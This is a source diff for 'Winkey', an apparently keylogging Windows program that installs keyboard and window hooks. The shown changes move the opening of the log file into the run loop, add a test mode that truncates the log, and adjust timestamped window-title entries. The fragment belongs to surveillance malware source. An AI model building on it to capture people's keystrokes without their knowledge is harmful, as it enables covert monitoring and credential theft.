@@ -15,15 +15,6 @@ Winkey::Winkey()
     if (GetLastError() == ERROR_ALREADY_EXISTS)
         throw InstanceAlreadyRunnningException();
 
-    // Open the outfile in appending mode
-    _logFile.open(_logFileName, std::ios::app);
-    if (!_logFile.is_open())
-        throw FileOpenFailureException();
-
-    // Tell std::wofstream to use UTF-8 encoding when writing wide
-    //  characters (wchar_t) to the file.
-    _logFile.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));
-
     // Set window and keyboard hooks
     try
     {
@@ -57,6 +48,22 @@ void Winkey::setHooks()
 // Run the main loop of the program
 void Winkey::run(bool testMode)
 {
+    // Check if the test mode is on
+    _testMode = testMode;
+
+    if (_testMode) // If test mode is on, we overwrite on the file
+        _logFile.open(_logFileName, std::ios::out | std::ios::trunc);
+    else
+        _logFile.open(_logFileName, std::ios::app); // Open in appending mode
+
+
+    if (!_logFile.is_open())
+        throw FileOpenFailureException();
+
+    // Tell std::wofstream to use UTF-8 encoding when writing wide
+    //  characters (wchar_t) to the file.
+    _logFile.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));
+
     /*
      * Main message loop
      * Blocks until a Windows message (like an event) is available.
@@ -64,9 +71,6 @@ void Winkey::run(bool testMode)
      */
 
     MSG msg;
-
-    _testMode = testMode;
-
     while (GetMessage(&msg, NULL, 0, 0))
     {
     }
@@ -81,11 +85,9 @@ void Winkey::logToFile()
     if (!_testMode && (_currentWindow != lastWindow))
     {
         time_t now = time(nullptr);
+        bool empty = _logFile.tellp() == 0;
 
-        std::ifstream file(_logFileName);
-        bool empty = file.peek() == std::ifstream::traits_type::eof();
-
-        _logFile << (empty ? L"" : L"\n\n[");
+        _logFile << (empty ? L"" : L"\n\n");
 
         /* Log the current date time
          *
@@ -98,7 +100,7 @@ void Winkey::logToFile()
         {
             // Add log to the logfile `[date time] - 'WINDOW_TITLE'`
             // `L` is for wide characters (Unicode)
-            _logFile << std::setfill(L'0')
+            _logFile << L"[" << std::setfill(L'0')
                      << std::setw(2) << localTime.tm_mday << L"."
                      << std::setw(2) << (localTime.tm_mon + 1) << L"."
                      << (localTime.tm_year + 1900) << L" "
